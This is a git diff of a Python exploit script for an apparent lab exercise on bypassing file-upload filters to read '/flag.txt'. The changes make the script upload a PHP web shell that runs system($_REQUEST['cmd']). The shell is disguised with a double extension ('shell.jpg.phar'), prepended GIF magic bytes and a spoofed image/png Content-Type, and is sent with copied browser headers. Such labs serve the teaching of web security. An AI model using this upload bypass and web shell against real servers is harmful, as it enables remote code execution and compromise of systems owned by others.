@@ -1,10 +1,12 @@
 """ 
 ---------------------------
-Whitelist Filters
+Type Filters
 ---------------------------
 
-1. The above exercise employs a blacklist and a whitelist test to block unwanted extensions and only allow image extensions. Try to bypass both to upload a PHP script and execute code to read "/flag.txt"
-
+1. The above server employs Client-Side, Blacklist, Whitelist, Content-Type, 
+    and MIME-Type filters to ensure the uploaded file is an image. Try to combine 
+    all of the attacks you learned so far to bypass these filters and upload a PHP file 
+    and read the flag at "/flag.txt"
 
 """
 
@@ -51,8 +53,8 @@ def main():
     target = sys.argv[1].strip().rstrip('/')   # from CLI202
     
     # ============================ PHP SCRIPT ============================ #
-    php_web_shell_filename = "shell.phar.png"
-    php_content = "<?php system($_REQUEST['cmd']); ?>"
+    php_web_shell_filename = "shell.jpg.phar"
+    php_content = "GIF8 <?php system($_REQUEST['cmd']); ?>"
     
     # ============================ UPLOAD AND ACCESS URL of TARGET ============================ #
     upload_url = f"http://{target}/upload.php"
@@ -76,13 +78,24 @@ def main():
 def upload_file(php_web_shell_filename, php_content, upload_url):
     # FILE INFORMATION
     files = {
-        # form field name 'file' may vary by app; change if necessary
-        "uploadFile": (php_web_shell_filename, php_content.encode("utf-8"), "application/x-php"),
+        # form field name matches the one in Burp capture
+        "uploadFile": (php_web_shell_filename, php_content.encode("utf-8"), "image/png"),
+    }
+    # Add specific headers from Burp capture
+    headers = {
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
+        "Accept": "*/*",
+        "Accept-Language": "en-US,en;q=0.5",
+        "Accept-Encoding": "gzip, deflate, br",
+        "X-Requested-With": "XMLHttpRequest",
+        "DNT": "1",
+        "Sec-GPC": "1",
+        "Connection": "keep-alive"
     }
     # ============================ Initiate the Request to UPLOAD PHP FILE  ============================ #
     try:
         # WARNING: verify=False disables TLS certificate verification.
-        r = requests.post(upload_url, files=files, verify=False, timeout=10)
+        r = requests.post(upload_url, files=files, headers=headers, verify=False, timeout=10)
     except requests.RequestException as e:
         print(f"Request failed: {e}")
         sys.exit(2)   
